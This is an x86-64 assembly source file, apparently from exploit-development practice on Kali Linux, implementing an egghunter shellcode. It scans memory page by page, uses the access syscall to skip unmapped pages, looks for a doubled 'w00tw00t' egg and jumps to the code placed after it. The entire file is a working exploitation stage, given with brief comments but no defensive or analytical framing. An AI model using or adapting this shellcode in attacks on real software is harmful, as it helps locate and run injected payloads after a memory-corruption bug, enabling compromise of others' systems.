global _start
section .text

_start:

	xor rdx,rdx
next_page:
	or dx,0xfff 		;page alignment , meaning that it jump to next page of memory 

next_address:
	inc rdx		; increment the pointer in that page 

	xor rax,rax
	mov rsi,rax

;kali@kali:~/Desktop$ cat /usr/include/x86_64-linux-gnu/asm/unistd_64.h | grep "access"
;#define __NR_access 21

	add al,21	;check () syscall

	xor rdi,rdi
	mov rdi,rdx

	syscall

	cmp al,0xf2 			; EFAULT CECK

	jz next_page


    mov rax, 0x7430307774303077 ; w00tw00t
    mov rdi, rdx                ;

    scasq            ; comparing the egg location

    jnz next_address ; if it dosent match increase memory by one byte

    scasq            ; comparing the egg locaton

    jnz next_address ; if this is not zero it's not a match

    jmp rdi      ; if egg found jump to shellcode
